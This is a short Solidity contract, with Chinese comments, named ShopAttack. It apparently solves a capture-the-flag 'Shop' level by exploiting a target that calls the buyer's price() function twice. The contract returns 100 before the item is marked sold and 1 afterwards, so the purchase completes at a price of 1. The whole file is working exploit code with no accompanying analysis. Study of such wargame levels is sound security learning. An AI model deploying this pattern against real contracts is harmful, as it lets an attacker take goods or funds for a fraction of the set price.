// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IShop {
    function buy() external;
    function isSold() external view returns (bool);
}

contract ShopAttack {
    IShop public target;

    constructor(address _target) {
        target = IShop(_target);
    }

    // 實作 IBuyer 接口
    // 利用 Shop 合約已經被修改的 isSold 狀態來切換回傳值
    function price() external view returns (uint256) {
        if (!target.isSold()) {
            return 100; // 第一次呼叫：滿足 if (_buyer.price() >= price)
        } else {
            return 1;   // 第二次呼叫：設定最終 price = 1
        }
    }

    function attack() external {
        target.buy();
    }
}
